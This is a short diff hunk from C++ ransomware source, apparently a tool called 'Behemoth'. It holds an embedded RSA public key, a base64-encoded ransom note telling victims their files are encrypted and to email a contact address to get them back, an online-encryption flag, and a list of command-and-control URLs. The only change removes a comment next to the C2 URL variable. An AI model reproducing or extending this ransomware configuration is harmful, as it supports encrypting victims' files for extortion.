@@ -31,7 +31,7 @@ std::string PUBLIC_KEY = "MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEArmP8h2N1E1
 std::string README = "WW91ciBmaWxlcyBoYXMgYmVlbiBlbmNyeXB0ZWQgd2l0aCBCZWhlbW90aCByYW5zb213YXJlLgoKVGhlIGZpbGUgaGFzaCBmb3IgdGhpcyBleGVjdXRhYmxlIGlzIFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFgKCkNvbnN0YW50IHVzIGF0IGNvbnN0YW50QGMwbnN0YW50LmNhIHdpdGggdGhlIGV4ZWN1dGFibGUncyBoYXNoIHRvIGRlY3J5cHQgeW91ciBmaWxlcy4KCg==";
 
 bool ONLINE_ENC = true;
-std::wstring C2_URL = L"";                /// populate this with if statements inside main
+std::wstring C2_URL = L""; 
 std::vector<std::wstring> URLS = {
         L"http://10.0.0.140/",
         L"https://10.0.0.113:5000/",
